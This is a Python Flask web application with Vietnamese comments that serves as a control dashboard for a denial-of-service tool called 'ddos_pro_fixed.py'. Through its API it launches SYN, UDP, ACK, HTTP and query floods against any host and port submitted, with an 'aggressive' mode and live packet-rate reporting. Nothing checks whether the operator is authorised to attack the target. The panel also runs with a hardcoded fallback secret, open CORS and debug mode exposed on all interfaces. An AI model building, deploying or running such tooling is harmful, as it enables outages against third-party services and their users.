#!/usr/bin/env python3
import os
import sys
import json
import subprocess
import threading
import time
import logging
import psutil
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_socketio import SocketIO, emit

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# Khởi tạo Flask app và SocketIO
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "ddos_pro_secret_key")
socketio = SocketIO(app, cors_allowed_origins="*")

# Biến toàn cục để theo dõi trạng thái
attack_process = None
attack_stats = {
    "start_time": None,
    "status": "idle",  # idle, running, completed, error
    "packets_sent": 0,
    "peak_rate": 0,
    "current_rate": 0,
    "average_rate": 0,
    "syn_count": 0,
    "udp_count": 0,
    "ack_count": 0,
    "http_count": 0,
    "query_count": 0,
    "cpu_usage": 0,
    "ram_usage": 0,
    "output_lines": [],
    "duration": 0,
    "target": "",
    "port": 0,
    "error": None
}

# Khóa để đồng bộ hóa truy cập vào attack_stats
stats_lock = threading.Lock()

def parse_output_line(line):
    """Phân tích dòng đầu ra từ công cụ DDoS"""
    stats = {}
    try:
        if "Đã gửi:" in line:
            # Phân tích dòng thống kê chính
            parts = line.split("|")
            for part in parts:
                part = part.strip()
                if "Đã gửi:" in part:
                    stats["packets_sent"] = int(part.split(":")[1].strip().replace(",", "").split()[0])
                elif "Tốc độ:" in part:
                    stats["current_rate"] = int(part.split(":")[1].strip().replace(",", "").split()[0])
                elif "TB:" in part:
                    stats["average_rate"] = float(part.split(":")[1].strip())
                elif "Cao nhất:" in part:
                    stats["peak_rate"] = int(part.split(":")[1].strip().replace(",", ""))
                elif "CPU:" in part:
                    cpu_part = part.split("CPU:")[1].strip()
                    stats["cpu_usage"] = float(cpu_part.split("%")[0])
                    if "RAM:" in cpu_part:
                        ram_part = cpu_part.split("RAM:")[1].strip()
                        stats["ram_usage"] = float(ram_part.split("%")[0])
                elif "Thời gian:" in part:
                    stats["elapsed"] = float(part.split(":")[1].strip().split("s")[0])
        elif "SYN:" in line and "UDP:" in line and "ACK:" in line:
            # Phân tích dòng chi tiết tấn công
            parts = line.split("|")
            for part in parts:
                part = part.strip()
                if "SYN:" in part:
                    stats["syn_count"] = int(part.split(":")[1].strip())
                elif "UDP:" in part:
                    stats["udp_count"] = int(part.split(":")[1].strip())
                elif "ACK:" in part:
                    stats["ack_count"] = int(part.split(":")[1].strip())
                elif "HTTP:" in part:
                    stats["http_count"] = int(part.split(":")[1].strip())
                elif "Query:" in part:
                    stats["query_count"] = int(part.split(":")[1].strip())
    except Exception as e:
        logger.error(f"Lỗi khi phân tích đầu ra: {e}")
    
    return stats

def monitor_process_output(process):
    """Theo dõi và phân tích đầu ra từ tiến trình tấn công"""
    global attack_stats
    
    for line in iter(process.stdout.readline, b''):
        line_text = line.decode('utf-8').strip()
        
        # Cập nhật dòng đầu ra
        with stats_lock:
            attack_stats["output_lines"].append(line_text)
            # Giới hạn số lượng dòng lưu trữ
            if len(attack_stats["output_lines"]) > 100:
                attack_stats["output_lines"] = attack_stats["output_lines"][-100:]
        
        # Phân tích dòng thống kê
        stats = parse_output_line(line_text)
        if stats:
            with stats_lock:
                attack_stats.update(stats)
            
            # Gửi cập nhật qua SocketIO
            socketio.emit('attack_update', {
                'status': attack_stats["status"],
                'stats': {
                    'packets_sent': attack_stats["packets_sent"],
                    'current_rate': attack_stats["current_rate"],
                    'average_rate': attack_stats["average_rate"],
                    'peak_rate': attack_stats["peak_rate"],
                    'syn_count': attack_stats["syn_count"],
                    'udp_count': attack_stats["udp_count"],
                    'ack_count': attack_stats["ack_count"],
                    'http_count': attack_stats["http_count"],
                    'query_count': attack_stats["query_count"],
                    'cpu_usage': attack_stats["cpu_usage"],
                    'ram_usage': attack_stats["ram_usage"],
                    'elapsed': stats.get("elapsed", 0),
                    'duration': attack_stats["duration"]
                },
                'output': attack_stats["output_lines"][-10:]  # Chỉ gửi 10 dòng mới nhất
            })
        
        # Kiểm tra nếu quá trình đã hoàn thành
        if "Kết thúc!" in line_text:
            with stats_lock:
                attack_stats["status"] = "completed"
            socketio.emit('attack_completed', {
                'packets_sent': attack_stats["packets_sent"],
                'average_rate': attack_stats["average_rate"],
                'peak_rate': attack_stats["peak_rate"],
                'duration': attack_stats["duration"]
            })
            break
    
    # Kiểm tra trạng thái kết thúc của tiến trình
    return_code = process.wait()
    if return_code != 0 and attack_stats["status"] != "completed":
        with stats_lock:
            attack_stats["status"] = "error"
            attack_stats["error"] = f"Tiến trình kết thúc với mã lỗi: {return_code}"
        socketio.emit('attack_error', {'error': attack_stats["error"]})

def start_attack(params):
    """Bắt đầu một cuộc tấn công mới"""
    global attack_process, attack_stats
    
    # Nếu đang có một cuộc tấn công, không cho phép bắt đầu
    if attack_process is not None and attack_process.poll() is None:
        return False, "Một cuộc tấn công đang chạy"
    
    # Xây dựng lệnh
    cmd = [
        "python", "ddos_pro_fixed.py",
        "--host", params["host"],
        "--port", str(params["port"]),
        "--processes", str(params["processes"]),
        "--duration", str(params["duration"]),
        "--attack-ratio", params["attack_ratio"],
        "--batch-size", str(params["batch_size"]),
        "--delay", str(params["delay"])
    ]
    
    if params.get("aggressive", False):
        cmd.append("--aggressive")
    
    if params.get("socket_only", True):
        cmd.append("--socket-only")
    
    # Reset thống kê
    with stats_lock:
        attack_stats = {
            "start_time": datetime.now(),
            "status": "running",
            "packets_sent": 0,
            "peak_rate": 0,
            "current_rate": 0,
            "average_rate": 0,
            "syn_count": 0,
            "udp_count": 0,
            "ack_count": 0,
            "http_count": 0,
            "query_count": 0,
            "cpu_usage": 0,
            "ram_usage": 0,
            "output_lines": [],
            "duration": params["duration"],
            "target": params["host"],
            "port": params["port"],
            "error": None
        }
    
    try:
        # Bắt đầu tiến trình
        attack_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=False,
            bufsize=1
        )
        
        # Bắt đầu một thread để theo dõi đầu ra
        monitor_thread = threading.Thread(target=monitor_process_output, args=(attack_process,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        socketio.emit('attack_started', {
            'target': params["host"],
            'port': params["port"],
            'duration': params["duration"]
        })
        
        return True, "Tấn công đã bắt đầu"
    except Exception as e:
        error_msg = f"Lỗi khi bắt đầu tấn công: {str(e)}"
        with stats_lock:
            attack_stats["status"] = "error"
            attack_stats["error"] = error_msg
        socketio.emit('attack_error', {'error': error_msg})
        return False, error_msg

def stop_attack():
    """Dừng cuộc tấn công đang chạy"""
    global attack_process, attack_stats
    
    if attack_process is None or attack_process.poll() is not None:
        return False, "Không có cuộc tấn công nào đang chạy"
    
    try:
        # Dừng tiến trình
        attack_process.terminate()
        time.sleep(1)
        if attack_process.poll() is None:
            attack_process.kill()
        
        with stats_lock:
            attack_stats["status"] = "stopped"
        
        socketio.emit('attack_stopped', {
            'packets_sent': attack_stats["packets_sent"],
            'duration': attack_stats["duration"]
        })
        
        return True, "Tấn công đã dừng"
    except Exception as e:
        error_msg = f"Lỗi khi dừng tấn công: {str(e)}"
        return False, error_msg

@app.route('/')
def index():
    """Trang chủ"""
    return render_template('index.html')

@app.route('/api/start_attack', methods=['POST'])
def api_start_attack():
    """API để bắt đầu một cuộc tấn công mới"""
    params = request.json
    
    # Kiểm tra và thiết lập giá trị mặc định
    target_host = params.get('host', '')
    target_port = int(params.get('port', 80))
    processes = min(int(params.get('processes', 4)), 8)  # Giới hạn số lượng processes
    duration = min(int(params.get('duration', 60)), 300)  # Giới hạn thời gian tấn công
    attack_ratio = params.get('attack_ratio', '30:20:20:20:10')
    batch_size = min(int(params.get('batch_size', 200)), 2000)
    delay = max(float(params.get('delay', 0.005)), 0.001)
    aggressive = params.get('aggressive', False)
    socket_only = params.get('socket_only', True)
    
    # Kiểm tra tính hợp lệ của địa chỉ IP hoặc tên miền
    if not target_host:
        return jsonify({'success': False, 'message': 'Địa chỉ IP hoặc tên miền không hợp lệ'})
    
    # Bắt đầu tấn công
    success, message = start_attack({
        'host': target_host,
        'port': target_port,
        'processes': processes,
        'duration': duration,
        'attack_ratio': attack_ratio,
        'batch_size': batch_size,
        'delay': delay,
        'aggressive': aggressive,
        'socket_only': socket_only
    })
    
    return jsonify({'success': success, 'message': message})

@app.route('/api/stop_attack', methods=['POST'])
def api_stop_attack():
    """API để dừng một cuộc tấn công đang chạy"""
    success, message = stop_attack()
    return jsonify({'success': success, 'message': message})

@app.route('/api/status')
def api_status():
    """API để lấy trạng thái hiện tại của cuộc tấn công"""
    with stats_lock:
        return jsonify({
            'status': attack_stats["status"],
            'stats': {
                'packets_sent': attack_stats["packets_sent"],
                'current_rate': attack_stats["current_rate"],
                'average_rate': attack_stats["average_rate"],
                'peak_rate': attack_stats["peak_rate"],
                'syn_count': attack_stats["syn_count"],
                'udp_count': attack_stats["udp_count"],
                'ack_count': attack_stats["ack_count"],
                'http_count': attack_stats["http_count"],
                'query_count': attack_stats["query_count"],
                'cpu_usage': attack_stats["cpu_usage"],
                'ram_usage': attack_stats["ram_usage"],
                'duration': attack_stats["duration"],
                'target': attack_stats["target"],
                'port': attack_stats["port"],
                'start_time': attack_stats["start_time"].isoformat() if attack_stats["start_time"] else None
            },
            'output': attack_stats["output_lines"][-50:]  # Trả về tối đa 50 dòng đầu ra
        })

@app.route('/api/system_resources')
def api_system_resources():
    """API để lấy thông tin về tài nguyên hệ thống"""
    try:
        cpu_percent = psutil.cpu_percent()
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        
        return jsonify({
            'cpu_percent': cpu_percent,
            'memory_percent': memory_percent,
            'memory_total': memory.total,
            'memory_used': memory.used
        })
    except Exception as e:
        return jsonify({'error': str(e)})

@socketio.on('connect')
def handle_connect():
    """Xử lý khi client kết nối SocketIO"""
    logger.info("Client kết nối SocketIO")

@socketio.on('disconnect')
def handle_disconnect():
    """Xử lý khi client ngắt kết nối SocketIO"""
    logger.info("Client ngắt kết nối SocketIO")

def create_directories():
    """Tạo cấu trúc thư mục cần thiết"""
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    os.makedirs('static/js', exist_ok=True)
    os.makedirs('static/css', exist_ok=True)
    os.makedirs('static/img', exist_ok=True)

if __name__ == '__main__':
    create_directories()
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)